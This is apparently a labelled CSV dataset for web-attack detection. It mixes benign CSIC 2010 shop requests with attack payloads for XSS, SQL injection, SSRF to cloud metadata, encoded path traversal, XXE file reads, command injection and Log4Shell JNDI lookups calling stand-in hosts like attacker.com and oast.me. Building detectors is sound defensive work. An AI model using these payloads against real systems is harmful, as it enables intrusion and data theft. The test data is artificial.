payload,label,source
"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1368&B1=Confirmar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=71EC452A2F24E99C1CEBEAA4E7847936 Connection: close",normal,csic_2010
"selector: 'my-app',",xss,payloads_all_the_things
"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=326663E2C11E048C578B68B2A2FE0676 Connection: close",normal,csic_2010
GET /?next=gopher://127.1:1099/admin HTTP/1.1,ssrf,augmented
"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=F0CF0BDBFA520638DD822890408456BF Connection: close",normal,csic_2010
"POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=8D4A1D5C2896F4E3C7D2613F699870C3 Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
C:\Program Files\IceWarp\html\webmail\client\languages\ru\data.xml,path_traversal,seclists
%c0%2e%c0%2e%%35%%63%c0%2e%c0%2e%%35%%63%c0%2e%c0%2e%%35%%63boot.ini,path_traversal,payloads_all_the_things
${jndi:ldaps://oast.me:53/${java:os}},log4shell,augmented
https://metadata.google.internal/.git/config,ssrf,augmented
<body onscroll=javascript:alert(6640)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>,xss,payloads_all_the_things
http://0xa9fea9fe = http://169.254.169.254,ssrf,payloads_all_the_things
C:\Windows\assembly\gac_32\presentationcore\3.0.0.0__31bf3856ad364e35\presentationfontcache.exe.config,path_traversal,seclists
${${::-j}${::-n}di:ldaps://interact.sh:1389/pwn},log4shell,augmented
"POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=13553FF7DEE2B2E3C22749EECDB32D53 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
${shell_exec(print(`echo%20OAPDKW;echo%20$((19%2B47));echo%20OAPDKW;echo%20OAPDKW`)%3BOAPDKW,command_injection,seclists
%fc%80%80%80%80%ae%fc%80%80%80%80%ae\%fc%80%80%80%80%ae%fc%80%80%80%80%ae\%fc%80%80%80%80%ae%fc%80%80%80%80%ae\etc\passwd,path_traversal,payloads_all_the_things
&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&apos;XSS&apos;);&quot;&gt;,xss,seclists
/etc/snmp/mib2c.create-dataset.conf,path_traversal,seclists
Exploit Description: Locally hosted XML with embedded JavaScript that is generated using an XML data island. This is the same as above but instead refers to a locally hosted (must be on the same server) XML file that contains the cross site scripting vector.,xss,seclists
"GET http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=D47E8EDFA6C20774C674CAF08E09D048 Connection: close",normal,csic_2010
%%32%%65%%32%%65%5cwindows%5csystem32%5cdrivers%5cetc%5chosts,path_traversal,payloads_all_the_things
%2e%c0%ae%2f%2e%c0%ae%2f%2e%c0%ae%2f%2e%c0%ae%2fboot.ini,path_traversal,payloads_all_the_things
"POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=3456F4DD59DDA87A29F7641B02365440 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=352E7185524BADD201BF18F359E985ED Connection: close",normal,csic_2010
modo=entrar&login=gloriane&pwd=ae57f5r4&remember=on&B1=Entrar,normal,csic_2010
query=$(ps aux),command_injection,augmented
"GET http://localhost:8080/tienda1/miembros/fotos.jsp.INC HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=76FA432C8B4EF844F01E1F5281085A06 Connection: close",sqli,csic_2010
"GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=95EB1F69DDC515D2B9921B13EC7006EB Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=34767E0A01B1B609FFFE78E7034E0659 Connection: close",normal,csic_2010
"<XML SRC=""http://ha.ckers.org/xsstest.xml"" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",xss,seclists
"GET http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=F871213AD984450D189F9B42480AFE3C Connection: close",normal,csic_2010
/etc/otrs/Output/HTML/Lite/PrintHeader.dtl,path_traversal,seclists
"<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE foo [<!external894 external894 SYSTEM ""file:///var/log/auth.log"">]><foo>&external894;</foo>",xxe,augmented
"POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=2CDEB441F98E96D25B6170BB2FD2BF49 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
/etc/p3scan/p3scan-it.mail,path_traversal,seclists
../../../../../../../../../../../../../../../../../../var/adm/log/xferlog%00,path_traversal,seclists
/etc/default/libnss-db,path_traversal,seclists
modo=insertar&precio=6110&B1=Confirmar,normal,csic_2010
modo=registro&login=youngman&password=a018699t0do&nombre=Ibar&apellidos=Linga%2Fn&email=damboise%40automovilesalhambra.co&dni=44906096E&direccion=Calle+Lima%2C+50+9-D&ciudad=Catadau&cp=42066&provincia=Madrid&ntc=0908077134973737&B1=Registrar,sqli,csic_2010
id=2&nombre=Queso+Manchego&precio=100&cantidad=74&B1=A%F1adir+al+carrito,normal,csic_2010
"POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=690857FA9F767FE260B022BA4881AE96 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
${${lower:j}ndi:ldaps://callback.net:9999/a},log4shell,augmented
..../%255c..../%255c..../%255c..../%255c..../%255cetc%255cissue,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=DF910D23E803FBE293A98E3D245F1359 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=E152E4BE67813639AAABEB60367B9885 Connection: close",normal,csic_2010
"<?xml version=""1.0""?><!DOCTYPE lolz [<!bar450 lol ""lol""><!bar450 bar450 ""&lol;&lol;&lol;&lol;"">]><lolz>&bar450;</lolz>",xxe,augmented
"<!DOCTYPE foo [<!data820 data820 PUBLIC ""-//ATT//DTD//EN"" ""http://evil.com/evil.dtd"">]><foo>&data820;</foo>",xxe,augmented
"GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=461F898604608F65A8D1F2ED6489FE5A Connection: close",normal,csic_2010
Accept-Language: ${jndi:iiop://oast.me:443/shell},log4shell,augmented
modo=entrar&login=holdaway&pwd=TAbuRETe&remember=on&B1=Entrar,normal,csic_2010
"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8695&B1=Confirmar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=75115EFBEC8AF43E90B3BA2A2A3FE001 Connection: close",normal,csic_2010
modo=insertar&precio=9246&B1=Pasar+por+caja%2F,sqli,csic_2010
"<caption draggable=""true"" ondragleave=""alert(1)"">test</caption>",xss,seclists
%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=E15FCCE86DA602509D17EAD4575EB01E Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/imagenes/2.gif.java HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=D6B5FF0F8ABC0E8B75CA909F65891059 Connection: close",sqli,csic_2010
"GET http://localhost:8080/_cti_pvt/uniqperm.cnf HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=27C89D2CD16E9DB035DCD157DE55EE90 Connection: close",sqli,csic_2010
.%2e%c1%9c.%2e%c1%9c.%2e%c1%9cetc%c1%9cissue,path_traversal,payloads_all_the_things
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA../windows/system32/drivers/etc/hosts,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=7E7FFC4F49A57A9AC777B2F85FA81C6C Connection: close",sqli,csic_2010
../../../../../../../../../usr/local/etc/httpd/conf/httpd.conf%00,path_traversal,seclists
"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=15B48F0BF9AD628A1AFEB823AE1FDC2B Connection: close",normal,csic_2010
"<?xml version=""1.0""?><!DOCTYPE foo [<!secret367 secret367 SYSTEM ""php://filter/convert.base64-encode/resource=/windows/win.ini"">]><foo>&secret367;</foo>",xxe,augmented
"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=chabert&pwd=ChInchintoR&remember=off&B1=Entrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=7D28DD82D016A9D7B026965D7CB60E40 Connection: close",normal,csic_2010
..%01%c0%af..%01%c0%af..%01%c0%af..%01%c0%afetc%c0%afissue,path_traversal,payloads_all_the_things
Referer: ${jndi:iiop://burpcollab.net:53/shell},log4shell,augmented
"GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=pettinge&password=bArBiMOre_Na&nombre=Rey&apellidos=Rebull+Canudes&email=gold.medwin%40maridosadomicilio.no&dni=96457070S&direccion=C%2F+Narcisa+Freixas%2C+61+13%3FH&ciudad=Peralejos+de+Abajo&cp=45479&provincia=%C1vila&ntc=9303943122471890&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=2BF76CC36E97E3566A726177A8B5327A Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/index.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=8BB55CB2077609F15C7408D0A29F4E27 Connection: close",normal,csic_2010
${j${::-n}di:ldaps://attacker.com:80/test},log4shell,augmented
"POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=1CD74AC2A8D4B1A9F88385E0395E0816 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=668&B1=Pasar+por+caja HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=EB48E4786157EEAD3ED3C23248C22F84 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=1493A2B17F600C359A5D3775BF7D5E2C Connection: close",normal,csic_2010
